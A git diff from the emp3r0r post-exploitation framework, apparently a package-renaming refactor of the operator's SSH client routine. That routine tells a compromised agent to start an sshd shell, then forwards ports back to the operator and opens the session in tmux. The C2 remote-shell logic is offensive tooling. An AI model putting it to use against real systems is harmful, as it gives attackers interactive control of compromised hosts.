@@ -12,18 +12,18 @@ import (
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/cli"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 type SSH_SHELL_Mapping struct {
-	Shell   string                    // the shell to run, eg. bash, python
-	Agent   *emp3r0r_def.Emp3r0rAgent // the agent this shell is connected to
-	PortFwd *network.PortFwdSession   // the port mapping for this shell session
-	ToPort  string                    // the port to connect to on the agent side, always the same as PortFwd.To's port
+	Shell   string                  // the shell to run, eg. bash, python
+	Agent   *def.Emp3r0rAgent       // the agent this shell is connected to
+	PortFwd *network.PortFwdSession // the port mapping for this shell session
+	ToPort  string                  // the port to connect to on the agent side, always the same as PortFwd.To's port
 }
 
 // shell - port mapping
@@ -52,10 +52,10 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 	}
 
 	// SSHDShellPort is reserved
-	is_new_port_needed := (port == runtime_def.RuntimeConfig.SSHDShellPort && shell != "sftp")
+	is_new_port_needed := (port == live.RuntimeConfig.SSHDShellPort && shell != "sftp")
 	// check if port mapping is already open, if yes, use it
 	for s, mapping := range SSHShellPort {
-		if s == shell && mapping.Agent == runtime_def.ActiveAgent {
+		if s == shell && mapping.Agent == live.ActiveAgent {
 			port = mapping.ToPort
 			is_new_port_needed = false
 		}
@@ -75,7 +75,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 		// if sftp is requested, we are not using `interactive_shell` module
 		// so no options to set
 		if !is_sftp {
-			runtime_def.SetOption("port", new_port)
+			live.SetOption("port", new_port)
 		}
 		logging.Warningf("Switching to a new port %s for shell (%s)", port, shell)
 	}
@@ -84,7 +84,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 	// is port mapping already done?
 	port_mapping_exists := false
 	for _, p := range network.PortFwds {
-		if p.Agent == runtime_def.ActiveAgent && p.To == to {
+		if p.Agent == live.ActiveAgent && p.To == to {
 			port_mapping_exists = true
 			for s, ssh_mapping := range SSHShellPort {
 				// one port for one shell
@@ -92,7 +92,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 				if s != shell && ssh_mapping.ToPort == port {
 					new_port := strconv.Itoa(util.RandInt(2048, 65535))
 					logging.Warningf("Port %s has %s shell on it, restarting with a different port %s", port, s, new_port)
-					runtime_def.SetOption("port", new_port)
+					live.SetOption("port", new_port)
 					err = SSHClient(shell, args, new_port, split)
 					return err
 				}
@@ -110,24 +110,24 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 		if args == "" {
 			args = "--"
 		}
-		cmd := fmt.Sprintf("%s --shell %s --port %s --args %s", emp3r0r_def.C2CmdSSHD, shell, port, args)
+		cmd := fmt.Sprintf("%s --shell %s --port %s --args %s", def.C2CmdSSHD, shell, port, args)
 		err = agents.SendCmdToCurrentAgent(cmd, cmd_id)
 		if err != nil {
 			return
 		}
-		logging.Infof("Waiting for sshd (%s) on target %s", shell, strconv.Quote(runtime_def.ActiveAgent.Tag))
+		logging.Infof("Waiting for sshd (%s) on target %s", shell, strconv.Quote(live.ActiveAgent.Tag))
 
 		// wait until sshd is up
 		defer func() {
-			runtime_def.CmdResultsMutex.Lock()
-			delete(runtime_def.CmdResults, cmd_id)
-			runtime_def.CmdResultsMutex.Unlock()
+			live.CmdResultsMutex.Lock()
+			delete(live.CmdResults, cmd_id)
+			live.CmdResultsMutex.Unlock()
 		}()
 		is_response := false
 		res := ""
 		for i := 0; i < 100; i++ {
 			time.Sleep(100 * time.Millisecond)
-			res, is_response = runtime_def.CmdResults[cmd_id]
+			res, is_response = live.CmdResults[cmd_id]
 			if is_response {
 				if strings.Contains(res, "success") ||
 					strings.Contains(res,
@@ -140,7 +140,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 			}
 		}
 		if !is_response {
-			err = fmt.Errorf("didn't get response from agent (%s), aborting", runtime_def.ActiveAgent.Tag)
+			err = fmt.Errorf("didn't get response from agent (%s), aborting", live.ActiveAgent.Tag)
 			return
 		}
 
@@ -155,7 +155,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 			// remember the port mapping and shell and agent
 			SSHShellPort[shell] = &SSH_SHELL_Mapping{
 				Shell:   shell,
-				Agent:   runtime_def.ActiveAgent,
+				Agent:   live.ActiveAgent,
 				PortFwd: pf,
 				ToPort:  port,
 			}
@@ -165,7 +165,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 				logging.Errorf("Start port mapping for sshd (%s): %v", shell, err)
 			}
 		}()
-		logging.Infof("Waiting for response from %s", runtime_def.ActiveAgent.Tag)
+		logging.Infof("Waiting for response from %s", live.ActiveAgent.Tag)
 		if err != nil {
 			return
 		}
@@ -180,7 +180,7 @@ wait:
 		}
 		time.Sleep(100 * time.Millisecond)
 		for _, p := range network.PortFwds {
-			if p.Agent == runtime_def.ActiveAgent && p.To == to {
+			if p.Agent == live.ActiveAgent && p.To == to {
 				port_mapping_exists = true
 				break wait
 			}
@@ -204,8 +204,8 @@ wait:
 	}
 
 	// agent name
-	name := runtime_def.ActiveAgent.Hostname
-	label := runtime_def.AgentControlMap[runtime_def.ActiveAgent].Label
+	name := live.ActiveAgent.Hostname
+	label := live.AgentControlMap[live.ActiveAgent].Label
 	if label != "nolabel" && label != "-" {
 		name = label
 	}
@@ -220,7 +220,7 @@ wait:
 	// if open in new tmux window
 	logging.Infof("\nOpening SSH (%s - %s) session for %s in Shell tab.\n"+
 		"If that fails, please execute command\n%s\nmanaully",
-		shell, port, runtime_def.ActiveAgent.Tag, sshCmd)
+		shell, port, live.ActiveAgent.Tag, sshCmd)
 
 	// if a shell is wanted, just open in new tmux window, you will see a new tab
 	return cli.TmuxNewWindow(fmt.Sprintf("shell/%s/%s-%s", name, shell, port), sshCmd)
